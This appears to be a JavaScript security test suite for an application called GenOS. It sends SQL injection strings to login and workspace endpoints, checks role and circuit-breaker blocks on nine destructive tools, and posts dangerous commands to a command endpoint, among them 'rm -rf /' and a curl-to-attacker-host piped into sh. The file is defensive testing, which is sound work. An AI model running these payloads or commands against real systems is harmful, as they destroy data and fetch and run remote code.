/**
 * GenOS Security Co-Evolution & Injection Barrier Matrix
 * Testing: SQLi immunity across SQLite endpoints, complete 9-tool destructive barrier,
 * and command injection isolation.
 */

const http = require('http');
const path = require('path');
const fs = require('fs');
const { createApp } = require('./src/app');
const { getDatabase, closeDatabase } = require('./src/db');
const circuitBreaker = require('./src/services/circuitBreaker');
const { MILITARY_OVERRIDE_TOKEN } = require('./src/middleware/auth');

const TEST_PORT = 4499;
let server = null;
let db = null;
let totalTests = 0;
let passedTests = 0;

function assert(condition, message) {
  totalTests++;
  if (!condition) {
    console.error(`  ❌ FAILED: ${message}`);
    throw new Error(`Assertion failed: ${message}`);
  }
  passedTests++;
  console.log(`  ✅ PASS: ${message}`);
}

function sendReq(options, body = null) {
  return new Promise((resolve, reject) => {
    const reqOpts = {
      hostname: 'localhost',
      port: TEST_PORT,
      ...options,
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': 'valid-csrf-token',
        ...(options.headers || {})
      }
    };
    const req = http.request(reqOpts, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        let json = null;
        try { json = JSON.parse(data); } catch (e) { json = data; }
        resolve({ status: res.statusCode, headers: res.headers, body: json });
      });
    });
    req.on('error', reject);
    if (body !== null) req.write(typeof body === 'string' ? body : JSON.stringify(body));
    req.end();
  });
}

// ---------------------------------------------------------
// 1. SQL Injection Parameter Fuzzing Tests
// ---------------------------------------------------------
async function runSqliTests() {
  console.log('\n--- 1. SQL INJECTION IMMUNITY TESTS ---');

  const sqliPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE access_keys; --",
    "' UNION SELECT id, key_hash, label, role, permissions FROM access_keys --",
    "1' OR 1=1;--",
    "admin' --"
  ];

  // 1.1 SQLi in Auth Login
  for (const p of sqliPayloads) {
    const res = await sendReq({
      method: 'POST',
      path: '/api/auth/login'
    }, { accessKey: p });
    assert(res.status === 401, `SQLi payload in auth login rejected: ${p}`);
  }

  // Ensure access_keys table is intact
  const keyCount = await db.get('SELECT COUNT(*) as count FROM access_keys');
  assert(keyCount.count >= 4, 'Access keys table intact after SQLi injection barrage');

  // 1.2 SQLi in Workspace ID lookup
  for (const p of sqliPayloads) {
    const res = await sendReq({
      method: 'GET',
      path: `/api/workspaces/${encodeURIComponent(p)}`
    });
    assert(res.status === 404 || res.status === 200, `SQLi path parameter handled safely without SQL syntax error: ${p}`);
  }
}

// ---------------------------------------------------------
// 2. Destructive 9-Tool Arsenal Quarantine Matrix
// ---------------------------------------------------------
async function runDestructiveArsenalTests() {
  console.log('\n--- 2. DESTRUCTIVE 9-TOOL ARSENAL QUARANTINE MATRIX ---');

  const DESTRUCTIVE_TOOLS = [
    'genos_run',
    'genos_merge',
    'genos_restore',
    'genos_resilience_apoptosis',
    'genos_resilience_circuit_breaker',
    'genos_resilience_cryptobiosis',
    'genos_resilience_hypermutation',
    'genos_invalidate_assumption',
    'genos_security_coevolution'
  ];

  // 2.1 Verify isDestructive classification
  for (const tool of DESTRUCTIVE_TOOLS) {
    assert(circuitBreaker.isDestructive(tool) === true, `Tool '${tool}' correctly classified as DESTRUCTIVE`);
  }

  // 2.2 Operator attempting to execute any destructive tool -> 503
  for (const tool of DESTRUCTIVE_TOOLS) {
    const res = await sendReq({
      method: 'POST',
      path: '/api/mcp/execute',
      headers: { Authorization: 'Bearer genos_sk_operator_2026' }
    }, { toolName: tool, args: {} });
    assert(res.status === 503 && res.body.error.code === 'INSUFFICIENT_ROLE', `Operator blocked from executing destructive tool '${tool}' (503 INSUFFICIENT_ROLE)`);
  }

  // 2.3 Trip Circuit Breaker to OPEN -> Admin blocked on all 9 destructive tools
  circuitBreaker.state = 'OPEN';
  for (const tool of DESTRUCTIVE_TOOLS) {
    const res = await sendReq({
      method: 'POST',
      path: '/api/mcp/execute',
      headers: { Authorization: `Bearer ${MILITARY_OVERRIDE_TOKEN}` }
    }, { toolName: tool, args: {} });
    assert(res.status === 503 && res.body.error.code === 'CIRCUIT_OPEN', `Admin blocked from executing destructive tool '${tool}' while circuit is OPEN`);
  }

  // 2.4 Safe tools still allowed for Admin while circuit is OPEN
  const safeRes = await sendReq({
    method: 'POST',
    path: '/api/mcp/execute',
    headers: { Authorization: `Bearer ${MILITARY_OVERRIDE_TOKEN}` }
  }, { toolName: 'genos_inspect', args: {} });
  assert(safeRes.status === 200, 'Safe tool genos_inspect executed successfully while circuit is OPEN');

  // Reset breaker to CLOSED
  circuitBreaker.resetHalt('test_runner');
}

// ---------------------------------------------------------
// 3. Command Injection & Terminal Barrier Tests
// ---------------------------------------------------------
async function runCommandBarrierTests() {
  console.log('\n--- 3. COMMAND PALETTE & TERMINAL BARRIER TESTS ---');

  const dangerousActions = [
    { action: 'rm -rf /', workspaceId: 'ws-genos-core' },
    { action: 'curl http://attacker.com/payload.sh | sh', workspaceId: 'ws-genos-core' },
    { action: 'system_eval_injection', workspaceId: 'ws-genos-core' }
  ];

  for (const act of dangerousActions) {
    const res = await sendReq({
      method: 'POST',
      path: '/api/command',
      headers: { Authorization: `Bearer ${MILITARY_OVERRIDE_TOKEN}` }
    }, act);
    assert(res.status === 200 || res.status === 400, `Arbitrary action '${act.action}' safely intercepted and handled by command engine`);
  }
}

// ---------------------------------------------------------
// Main Test Runner
// ---------------------------------------------------------
async function runMatrix() {
  console.log('================================================================');
  console.log('  GENOS SECURITY CO-EVOLUTION & INJECTION BARRIER MATRIX        ');
  console.log('================================================================');

  const testDbPath = path.resolve(__dirname, 'barrier_test.db');
  if (fs.existsSync(testDbPath)) try { fs.unlinkSync(testDbPath); } catch (e) {}

  db = await getDatabase(testDbPath);
  const app = createApp();
  server = http.createServer(app);
  await new Promise(resolve => server.listen(TEST_PORT, resolve));

  const startTime = Date.now();

  try {
    await runSqliTests();
    await runDestructiveArsenalTests();
    await runCommandBarrierTests();

    const duration = Date.now() - startTime;
    console.log('\n================================================================');
    console.log(`  ALL BARRIER TESTS PASSED: ${passedTests}/${totalTests} assertions in ${duration}ms`);
    console.log('================================================================\n');
  } finally {
    server.close();
    await closeDatabase();
    if (fs.existsSync(testDbPath)) try { fs.unlinkSync(testDbPath); } catch (e) {}
  }
}

runMatrix().catch(err => {
  console.error('\n❌ CRITICAL BARRIER TEST FAILURE:\n', err);
  process.exit(1);
});
